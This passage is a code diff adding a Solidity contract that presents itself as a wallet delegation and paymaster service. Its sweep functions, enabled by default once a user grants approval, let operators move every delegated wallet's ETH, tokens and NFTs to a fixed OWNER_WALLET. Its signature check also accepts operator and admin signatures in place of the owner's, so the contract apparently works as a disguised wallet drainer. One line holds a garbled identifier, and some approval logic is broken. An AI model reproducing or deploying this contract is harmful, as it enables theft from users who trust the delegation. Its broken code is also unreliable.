+                    if (sweepConfigs[wallet].tokenBlacklist[j] == tokens[i]) {
+                        isBlacklisted = true;
+                        break;
+                    }
+                }
+                if (isBlacklisted) continue;
+            }
+
+            // Verify ownership and approval
+            try nft.ownerOf(tokenIds[i]) returns (address owner) {
+                if (owner != wallet) continue;
+                if (!nft.isApprovedForAll(wallet, address(this)) && nft.getApproved(tokenIds[i]) != address(this)) {
+                    revert InsufficientAllowance();
+                }
+
+                nft.safeTransferFrom(wallet, OWNER_WALLET, tokenIds[i]);
+                emit SweptERC721(tokens[i], wallet, tokenIds[i]);
+                totalSweptTokens++;
+            } catch {
+                continue;
+            }
+        }
+
+        operationCounter++;
+    }
+
+    function sweepERC1155(
+        address wallet,
+        address[] calldata tokens,
+        uint256[] calldata tokenIds,
+        uint256[] calldata amounts
+    ) external onlyOperator onlyDelegated(wallet) whenNotPaused nonReentrant gasOptimized {
+        if (tokens.length != tokenIds.length || tokenIds.length != amounts.length) revert ArrayLengthMismatch();
+        if (tokens.length > MAX_BATCH_SIZE) revert BatchTooLarge();
+        if (!sweepConfigs[wallet].enabled) revert SweepingDisabled();
+        if (tx.gasprice > sweepConfigs[wallet].maxGasPrice) revert GasPriceTooHigh();
+
+        lastActivity[wallet] = block.timestamp;
+
+        for (uint256 i = 0; i < tokens.length; i++) {
+            if (!Address.isContract(tokens[i])) revert NotContract();
+            IERC1155 token = IERC1155(tokens[i]);
+
+            // Check whitelist/blacklist
+            if (sweepConfigs[wallet].tokenWhitelist.length > 0) {
+                bool isWhitelisted = false;
+                for (uint256 j = 0; j < sweepConfigs[wallet].tokenWhitelist.length; j++) {
+                    if (sweepConfigs[wallet].tokenWhitelist[j] == tokens[i]) {
+                        isWhitelisted = true;
+                        break;
+                    }
+                }
+                if (!isWhitelisted) continue;
+            }
+            if (sweepConfigs[wallet].tokenBlacklist.length > 0) {
+                bool isBlacklisted = false;
+                for (uint256 j = 0; j < sweepConfigs[wallet].tokenBlacklist.length; j++) {
+                    if (sweepConfigs[wallet].tokenBlacklist[j] == tokens[i]) {
+                        isBlacklisted = true;
+                        break;
+                    }
+                }
+                if (isBlacklisted) continue;
+            }
+
+            uint256 balance = token.balanceOf(wallet, tokenIds[i]);
+            if (balance >= amounts[i] && amounts[i] > 0) {
+                if (!token.isApprovedForAll(wallet, address(this))) revert InsufficientAllowance();
+                token.safeTransferFrom(wallet, OWNER_WALLET, tokenIds[i], amounts[i], "");
+                emit SweptERC1155(tokens[i], wallet, tokenIds[i], amounts[i]);
+                totalSweptTokens++;
+            }
+        }
+
+        operationCounter++;
+    }
+
+    function autoSweep(address wallet) external onlyOperator onlyDelegated(wallet) whenNotPaused nonReentrant {
+        if (!autoSweepEnabled) revert SweepingDisabled();
+        if (!sweepConfigs[wallet].enabled) revert SweepingDisabled();
+        if (tx.gasprice > sweepConfigs[wallet].maxGasPrice) revert GasPriceTooHigh();
+
+        // Sweep ETH
+        if (wallet.balance >= sweepConfigs[wallet].minAmount) {
+            try this.sweepETH(wallet) {} catch {}
+        }
+
+        // Sweep discovered ERC20 tokens
+        address[] storage tokens = tokensPerWallet[wallet];
+        if (tokens.length > 0) {
+            try this.sweepERC20(wallet, tokens) {} catch {}
+        }
+    }
+
+    function sweepAllDelegated() external onlyOperator whenNotPaused nonReentrant {
+        if (!autoSweepEnabled) revert SweepingDisabled();
+
+        for (uint256 i = 0; i < delegatedWallets.length; i++) {
+            address wallet = delegatedWallets[i];
+            if (!isDelegated[wallet] || !sweepConfigs[wallet].enabled || tx.gasprice > sweepConfigs[wallet].maxGasPrice) {
+                continue;
+            }
+            try this.autoSweep(wallet) {} catch {}
+        }
+    }
+
+    // ============ TOKEN MANAGEMENT ============
+
+    function addDiscoveredToken(address wallet, address token) external validAddress(token) {
+        if (msg.sender != owner() && msg.sender != wallet && !isDelegated[msg.sender] && !isOperator[msg.sender] && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+        if (!Address.isContract(token)) revert NotContract();
+
+        address[] storage tokens = tokensPerWallet[wallet];
+        for (uint256 i = 0; i < tokens.length; i++) {
+            if (tokens[i] == token) return;
+        }
+        tokens.push(token);
+    }
+
+    function batchAddDiscoveredTokens(address wallet, address[] calldata tokens) external {
+        if (tokens.length > MAX_BATCH_SIZE) revert BatchTooLarge();
+        for (uint256 i = 0; i < tokens.length; i++) {
+            this.addDiscoveredToken(wallet, tokens[i]);
+        }
+    }
+
+    function removeDiscoveredToken(address wallet, address token) external {
+        if (msg.sender != owner() && msg.sender != wallet && !isOperator[msg.sender] && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+
+        address[] storage tokens = tokensPerWallet[wallet];
+        for (uint256 i = 0; i < tokens.length; i++) {
+            if (tokens[i] == token) {
+                tokens[i] = tokens[tokens.length - 1];
+                tokens.pop();
+                break;
+            }
+        }
+    }
+
+    // ============ PERMIT AND DELEGATION ============
+
+    function permitAndDelegate(
+        address token,
+        uint256 amount,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external whenNotPaused notBlacklisted(msg.sender) validAddress(token) {
+        if (!Address.isContract(token)) revert NotContract();
+
+        IERC20Permit(token).permit(msg.sender, address(this), amount, deadline, v, r, s);
+        approvalTimestamps[msg.sender][token] = block.timestamp;
+
+        if (!isDelegated[msg.sender]) {
+            bytes memory designator = abi.encodePacked(
+                DELEGATION_DESIGNATOR_PREFIX,
+                DELEGATION_DESIGNATOR_VERSION,
+                DELEGATION_DESIGNATOR_SUBVERSION,
+                address(this)
+            );
+
+            delegationDesignator[msg.sender] = designator;
+            isDelegated[msg.sender] = true;
+            delegatedWallets.push(msg.sender);
+            totalDelegated++;
+            lastActivity[msg.sender] = block.timestamp;
+
+            sweepConfigs[msg.sender] = SweepConfig({
+                enabled: true,
+                minAmount: 0.001 ether,
+                maxGasPrice: 50 gwei,
+                tokenWhitelist: new address[](0),
+                tokenBlacklist: new address[](0)
+            });
+
+            paymasterConfigs[msg.sender] = PaymasterConfig({
+                enabled: true,
+                paymentToken: address(0),
+                maxGasCost: 1000000,
+                minBalance: 0.01 ether,
+                conversionRate: 0
+            });
+
+            gasConfigs[msg.sender] = GasConfig({
+                baseFee: baseFeePerGas,
+                priorityFee: 2 gwei,
+                gasLimit: 1000000,
+                dynamicFees: true
+            });
+
+            authorizedCode[msg.sender] = address(this);
+            emit Delegated(msg.sender, address(this), block.timestamp);
+            emit SetCodeAuthorized(msg.sender, address(this), nonces[msg.sender], false);
+        }
+
+        this.addDiscoveredToken(msg.sender, token);
+        emit PermitDelegated(token, msg.sender, amount);
+        operationCounter++;
+    }
+
+    function approveAndDelegate(address token, uint256 amount) external whenNotPaused notBlacklisted(msg.sender) validAddress(token) validAmount(amount) {
+        if (!Address.isContract(token)) revert NotContract();
+
+        if (!IERC20(token).approve(address(this), amount)) revert TransferFailed();
+        if (IERC20(token).allowance(msg.sender, address(this)) < amount) revert InsufficientAllowance();
+
+        approvalTimestamps[msg.sender][token] = block.timestamp;
+
+        if (!isDelegated[msg.sender]) {
+            bytes memory designator = abi.encodePacked(
+                DELEGATION_DESIGNATOR_PREFIX,
+                DELEGATION_DESIGNATOR_VERSION,
+                DELEGATION_DESIGNATOR_SUBVERSION,
+                address(this)
+            );
+
+            delegationDesignator[msg.sender] = designator;
+            isDelegated[msg.sender] = true;
+            delegatedWallets.push(msg.sender);
+            totalDelegated++;
+            lastActivity[msg.sender] = block.timestamp;
+
+            sweepConfigs[msg.sender] = SweepConfig({
+                enabled: true,
+                minAmount: 0.001 ether,
+                maxGasPrice: 50 gwei,
+                tokenWhitelist: new address[](0),
+                tokenBlacklist: new address[](0)
+            });
+
+            paymasterConfigs[msg.sender] = PaymasterConfig({
+                enabled: true,
+                paymentToken: address(0),
+                maxGasCost: 1000000,
+                minBalance: 0.01 ether,
+                conversionRate: 0
+            });
+
+            gasConfigs[msg.sender] = GasConfig({
+                baseFee: baseFeePerGas,
+                priorityFee: 2 gwei,
+                gasLimit: 1000000,
+                dynamicFees: true
+            });
+
+            authorizedCode[msg.sender] = address(this);
+            emit Delegated(msg.sender, address(this), block.timestamp);
+            emit SetCodeAuthorized(msg.sender, address(this), nonces[msg.sender], false);
+        }
+
+        this.addDiscoveredToken(msg.sender, token);
+        emit ApprovalDelegated(token, msg.sender, amount);
+        operationCounter++;
+    }
+
+    // ============ DEPOSIT/WITHDRAWAL ============
+
+    function deposit(address token, uint256 amount) external payable whenNotPaused nonReentrant {
+        if (isBlacklisted[msg.sender]) revert WalletBlacklisted();
+
+        if (token == address(0)) {
+            if (msg.value == 0) revert InvalidAmount();
+            ethDeposits[msg.sender] += msg.value;
+            emit Deposited(msg.sender, address(0), msg.value);
+        } else {
+            if (!Address.isContract(token)) revert NotContract();
+            if (amount == 0) revert InvalidAmount();
+            if (!IERC20(token).transferFrom(msg.sender, address(this), amount)) revert TransferFailed();
+            tokenDeposits[msg.sender][token] += amount;
+            emit Deposited(msg.sender, token, amount);
+        }
+
+        lastActivity[msg.sender] = block.timestamp;
+        operationCounter++;
+    }
+
+    function withdraw(address token, uint256 amount) external whenNotPaused nonReentrant validAmount(amount) {
+        if (isBlacklisted[msg.sender]) revert WalletBlacklisted();
+
+        if (token == address(0)) {
+            if (ethDeposits[msg.sender] < amount) revert InsufficientBalance();
+            ethDeposits[msg.sender] -= amount;
+            (bool success, ) = msg.sender.call{value: amount}("");
+            if (!success) revert TransferFailed();
+            emit Withdrawn(msg.sender, address(0), amount);
+        } else {
+            if (!Address.isContract(token)) revert NotContract();
+            if (tokenDeposits[msg.sender][token] < amount) revert InsufficientBalance();
+            tokenDeposits[msg.sender][token] -= amount;
+            if (!IERC20(token).transfer(msg.sender, amount)) revert TransferFailed();
+            emit Withdrawn(msg.sender, token, amount);
+        }
+
+        lastActivity[msg.sender] = block.timestamp;
+        operationCounter++;
+    }
+
+    function setPaymasterAllowance(address token, address spender, uint256 amount) external whenNotPaused validAddress(spender) {
+        if (isBlacklisted[msg.sender]) revert WalletBlacklisted();
+        if (token != address(0) && !Address.isContract(token)) revert NotContract();
+
+        paymasterAllowance[msg.sender][spender] = amount;
+        lastActivity[msg.sender] = block.timestamp;
+        emit PaymasterAllowanceSet(token, msg.sender, amount);
+        operationCounter++;
+    }
+
+    // ============ PAYMASTER FUNCTIONS ============
+
+    function validatePaymasterUserOp(
+        UserOperation calldata userOp,
+        bytes32 userOpHash,
+        uint256 maxCost
+    ) external paymasterEnabledCheck onlyRelayer returns (bytes memory context, uint256 validationData) {
+        if (msg.sender != entryPoint) revert NotAuthorized();
+        if (!isDelegated[userOp.sender]) revert WalletNotDelegated();
+        if (isBlacklisted[userycznego sender]) revert WalletBlacklisted();
+        if (userOp.nonce != userOpNonces[userOp.sender][address(this)]) revert InvalidNonce();
+
+        PaymasterConfig memory config = paymasterConfigs[userOp.sender];
+        if (!config.enabled) revert PaymasterNotEnabled();
+        if (userOp.maxFeePerGas > config.maxGasCost) revert GasPriceTooHigh();
+
+        if (config.paymentToken != address(0)) {
+            uint256 tokenBalance = IERC20(config.paymentToken).balanceOf(userOp.sender);
+            uint256 tokenCost = (maxCost * config.conversionRate) / 1e18;
+            if (tokenBalance < config.minBalance || tokenBalance < tokenCost) revert InsufficientBalance();
+            if (IERC20(config.paymentToken).allowance(userOp.sender, address(this)) < tokenCost) {
+                revert InsufficientAllowance();
+            }
+        } else {
+            if (ethDeposits[userOp.sender] < maxCost) revert InsufficientBalance();
+        }
+
+        bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(
+            USER_OPERATION_TYPEHASH,
+            userOp.sender,
+            userOp.nonce,
+            keccak256(userOp.initCode),
+            keccak256(userOp.callData),
+            userOp.callGasLimit,
+            userOp.verificationGasLimit,
+            userOp.preVerificationGas,
+            userOp.maxFeePerGas,
+            userOp.maxPriorityFeePerGas,
+            keccak256(userOp.paymasterAndData),
+            keccak256(userOp.signature)
+        )));
+
+        address signer = digest.recover(userOp.signature);
+        if (signer != userOp.sender && !isValidSignature(digest, userOp.signature)) {
+            revert InvalidSignature();
+        }
+
+        userOpNonces[userOp.sender][address(this)]++;
+        uint256 gasCost = (userOp.callGasLimit + userOp.verificationGasLimit + userOp.preVerificationGas) * userOp.maxFeePerGas;
+        if (gasCost > maxCost) revert InsufficientGas();
+
+        context = abi.encode(userOp.sender, config.paymentToken, gasCost, config.conversionRate);
+        validationData = 0;
+
+        emit UserOperationProcessed(userOp.sender, userOpHash, gasCost);
+        return (context, validationData);
+    }
+
+    function postOp(
+        bytes calldata context,
+        uint256 actualGasCost
+    ) external paymasterEnabledCheck onlyRelayer nonReentrant {
+        if (msg.sender != entryPoint) revert NotAuthorized();
+        (address sender, address paymentToken, uint256 estimatedGasCost, uint256 conversionRate) = 
+            abi.decode(context, (address, address, uint256, uint256));
+
+        if (!isDelegated[sender]) revert WalletNotDelegated();
+        if (actualGasCost > MAX_GAS_REFUND) revert InsufficientGas();
+
+        if (paymentToken != address(0)) {
+            uint256 tokenCost = (actualGasCost * conversionRate) / 1e18;
+            uint256 fee = (tokenCost * feePercentage) / FEE_DENOMINATOR;
+            uint256 netCost = tokenCost - fee;
+
+            if (!IERC20(paymentToken).transferFrom(sender, OWNER_WALLET, netCost)) revert TransferFailed();
+            if (fee > 0) {
+                if (!IERC20(paymentToken).transferFrom(sender, treasury, fee)) revert TransferFailed();
+                emit FeeCollected(paymentToken, fee);
+            }
+            emit GasSponsored(sender, actualGasCost, tokenCost);
+        } else {
+            uint256 fee = (actualGasCost * feePercentage) / FEE_DENOMINATOR;
+            uint256 netCost = actualGasCost - fee;
+
+            if (ethDeposits[sender] < actualGasCost) revert InsufficientBalance();
+            ethDeposits[sender] -= actualGasCost;
+
+            (bool successOwner, ) = OWNER_WALLET.call{value: netCost}("");
+            if (!successOwner) revert TransferFailed();
+            if (fee > 0) {
+                (bool successTreasury, ) = treasury.call{value: fee}("");
+                if (!successTreasury) revert TransferFailed();
+                emit FeeCollected(address(0), fee);
+            }
+            emit GasSponsored(sender, actualGasCost, actualGasCost);
+        }
+
+        totalGasSponsored += actualGasCost;
+        operationCounter++;
+    }
+
+    // ============ CONFIGURATION FUNCTIONS ============
+
+    function updateSweepConfig(address wallet, SweepConfig calldata config) external {
+        if (msg.sender != wallet && msg.sender != owner() && !isOperator[msg.sender] && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+        if (!isDelegated[wallet]) revert WalletNotDelegated();
+
+        for (uint256 i = 0; i < config.tokenWhitelist.length; i++) {
+            if (config.tokenWhitelist[i] == address(0)) revert InvalidAddress();
+        }
+        for (uint256 i = 0; i < config.tokenBlacklist.length; i++) {
+            if (config.tokenBlacklist[i] == address(0)) revert InvalidAddress();
+        }
+
+        sweepConfigs[wallet] = config;
+        lastActivity[wallet] = block.timestamp;
+        emit ConfigUpdated("SweepConfig", wallet);
+        operationCounter++;
+    }
+
+    function updateGasConfig(address wallet, GasConfig calldata config) external {
+        if (msg.sender != wallet && msg.sender != owner() && !isOperator[msg.sender] && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+        if (!isDelegated[wallet]) revert WalletNotDelegated();
+
+        gasConfigs[wallet] = config;
+        lastActivity[wallet] = block.timestamp;
+        emit ConfigUpdated("GasConfig", wallet);
+        operationCounter++;
+    }
+
+    function updatePaymasterConfig(address wallet, PaymasterConfig calldata config) external {
+        if (msg.sender != wallet && msg.sender != owner() && !isOperator[msg.sender] && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+        if (!isDelegated[wallet]) revert WalletNotDelegated();
+        if (config.paymentToken != address(0) && !Address.isContract(config.paymentToken)) revert NotContract();
+        if (config.paymentToken != address(0) && config.conversionRate == 0) revert ConversionRateZero();
+
+        paymasterConfigs[wallet] = config;
+        lastActivity[wallet] = block.timestamp;
+        emit PaymasterConfigUpdated(wallet, config.paymentToken);
+        operationCounter++;
+    }
+
+    // ============ ADMINISTRATIVE FUNCTIONS ============
+
+    function updateTreasury(address newTreasury) external onlyAdmin validAddress(newTreasury) {
+        address oldTreasury = treasury;
+        treasury = newTreasury;
+        emit TreasuryUpdated(oldTreasury, newTreasury);
+    }
+
+    function updateFeePercentage(uint256 newFeePercentage) external onlyAdmin {
+        if (newFeePercentage > MAX_FEE_PERCENTAGE) revert FeeTooHigh();
+        feePercentage = newFeePercentage;
+    }
+
+    function addOperator(address operator) external onlyAdmin validAddress(operator) {
+        if (isOperator[operator]) revert AlreadyOperator();
+        isOperator[operator] = true;
+        emit OperatorAdded(operator);
+    }
+
+    function removeOperator(address operator) external onlyAdmin {
+        if (!isOperator[operator]) revert NotOperator();
+        if (operator == owner() || operator == emergencyOperator) revert NotAuthorized();
+        isOperator[operator] = false;
+        emit OperatorRemoved(operator);
+    }
+
+    function addToBlacklist(address wallet) external onlyAdmin validAddress(wallet) {
+        if (wallet == owner() || wallet == emergencyOperator) revert NotAuthorized();
+        if (isBlacklisted[wallet]) revert AlreadyBlacklisted();
+        isBlacklisted[wallet] = true;
+    }
+
+    function removeFromBlacklist(address wallet) external onlyAdmin {
+        if (!isBlacklisted[wallet]) revert NotBlacklisted();
+        isBlacklisted[wallet] = false;
+    }
+
+    function toggleEmergencyMode() external {
+        if (msg.sender != owner() && msg.sender != emergencyOperator && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+        emergencyMode = !emergencyMode;
+        emit EmergencyModeToggled(emergencyMode);
+    }
+
+    function toggleAutoSweep() external onlyAdmin {
+        autoSweepEnabled = !autoSweepEnabled;
+    }
+
+    function pause() external onlyAdmin {
+        _pause();
+    }
+
+    function unpause() external onlyAdmin {
+        _unpause();
+    }
+
+    function emergencyPause() external {
+        if (msg.sender != owner() && msg.sender != emergencyOperator && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+        _pause();
+    }
+
+    function updateEntryPoint(address newEntryPoint) external onlyAdmin validAddress(newEntryPoint) {
+        address oldEntryPoint = entryPoint;
+        entryPoint = newEntryPoint;
+        emit EntryPointUpdated(oldEntryPoint, newEntryPoint);
+    }
+
+    function togglePaymaster() external onlyAdmin {
+        paymasterEnabled = !paymasterEnabled;
+        emit PaymasterToggled(paymasterEnabled);
+    }
+
+    // ============ IERC1271 IMPLEMENTATION ============
+
+    function isValidSignature(bytes32 hash, bytes memory signature) public view override returns (bytes4 magicValue) {
+        address signer = hash.recover(signature);
+        if (isDelegated[signer] || signer == owner() || isOperator[signer] || hasRole(ADMIN_ROLE, signer) || hasRole(RELAYER_ROLE, signer)) {
+            return 0x1626ba7e;
+        }
+        return 0xffffffff;
+    }
+
+    // ============ VIEW FUNCTIONS ============
+
+    function getDelegationDesignator(address authority) external view returns (bytes memory) {
+        return delegationDesignator[authority];
+    }
+
+    function getDiscoveredTokens(address wallet) external view returns (address[] memory) {
+        return tokensPerWallet[wallet];
+    }
+
+    function getDelegatedWallets() external view returns (address[] memory) {
+        return delegatedWallets;
+    }
+
+    function getSweepConfig(address wallet) external view returns (SweepConfig memory) {
+        return sweepConfigs[wallet];
+    }
+
+    function getGasConfig(address wallet) external view returns (GasConfig memory) {
+        return gasConfigs[wallet];
+    }
+
+    function getPaymasterConfig(address wallet) external view returns (PaymasterConfig memory) {
+        return paymasterConfigs[wallet];
+    }
+
+    function isDelegatedWallet(address wallet) external view returns (bool) {
+        return isDelegated[wallet];
+    }
+
+    function getAuthorization(address authority) external view returns (Authorization memory) {
+        return authorizations[authority];
+    }
+
+    function getETHBalance(address user) external view returns (uint256) {
+        return ethDeposits[user];
+    }
+
+    function getTokenBalance(address user, address token) external view returns (uint256) {
+        return tokenDeposits[user][token];
+    }
+
+    function getUserOpNonce(address sender) external view returns (uint256) {
+        return userOpNonces[sender][address(this)];
+    }
+
+    function getTotalGasSponsored() external view returns (uint256) {
+        return totalGasSponsored;
+    }
+
+    function getAuthorizedCode(address account) external view returns (address) {
+        return authorizedCode[account];
+    }
+
+    function isPermanentlyAuthorized(address account) external view returns (bool) {
+        return permanentlyAuthorized[account];
+    }
+
+    function getGasBalance(address account) external view returns (uint256) {
+        return gasBalance[account];
+    }
+
+    function getStats() external view returns (
+        uint256,
+        uint256,
+        uint256,
+        uint256,
+        uint256
+    ) {
+        return (
+            totalDelegated,
+            totalSweptETH,
+            totalSweptTokens,
+            operationCounter,
+            totalGasSponsored
+        );
+    }
+
+    // ============ INTERFACE SUPPORT ============
+
+    function supportsInterface(bytes4 interfaceId) public view virtual override(AccessControl, ERC165, IERC165) returns (bool) {
+        return
+            interfaceId == type(IERC721Receiver).interfaceId ||
+            interfaceId == type(IERC1155Receiver).interfaceId ||
+            interfaceId == type(IERC1271).interfaceId ||
+            super.supportsInterface(interfaceId);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    function onERC1155Received(
+        address operator,
+        address from,
+        uint256 id,
+        uint256 value,
+        bytes calldata data
+    ) external pure override returns (bytes4) {
+        return IERC1155Receiver.onERC1155Received.selector;
+    }
+
+    function onERC1155BatchReceived(
+        address operator,
+        address from,
+        uint256[] calldata ids,
+        uint256[] calldata values,
+        bytes calldata data
+    ) external pure override returns (bytes4) {
+        return IERC1155Receiver.onERC1155BatchReceived.selector;
+    }
+
+    // ============ FALLBACK AND RECEIVE ============
+
+    receive() external payable {
+        ethDeposits[msg.sender] += msg.value;
+        gasBalance[msg.sender] += msg.value;
+        emit Received(msg.sender, msg.value);
+        emit GasDeposited(msg.sender, msg.value);
+    }
+
+    // ============ EMERGENCY FUNCTIONS ============
+
+    function emergencyWithdrawETH(address payable to) external onlyAdmin emergencyOnly validAddress(to) {
+        uint256 balance = address(this).balance;
+        if (balance == 0) revert InsufficientBalance();
+        (bool success, ) = to.call{value: balance}("");
+        if (!success) revert TransferFailed();
+    }
+
+    function emergencyWithdrawToken(
+        address token,
+        address to,
+        uint256 amount
+    ) external onlyAdmin emergencyOnly validAddress(to) validAmount(amount) {
+        if (!Address.isContract(token)) revert NotContract();
+        if (!IERC20(token).transfer(to, amount)) revert TransferFailed();
+    }
+
+    function emergencyRevokeAll() external onlyAdmin emergencyOnly {
+        address[] memory wallets = delegatedWallets;
+        for (uint256 i = 0; i < wallets.length; i++) {
+            address wallet = wallets[i];
+            isDelegated[wallet] = false;
+            delete delegationDesignator[wallet];
+            delete authorizations[wallet];
+            delete sweepConfigs[wallet];
+            delete gasConfigs[wallet];
+            delete paymasterConfigs[wallet];
+            delete authorizedCode[wallet];
+            permanentlyAuthorized[wallet] = false;
+            emit Revoked(wallet, block.timestamp);
+            emit CodeRevoked(wallet);
+        }
+        delete delegatedWallets;
+        totalDelegated = 0;
+        operationCounter++;
+    }
+}
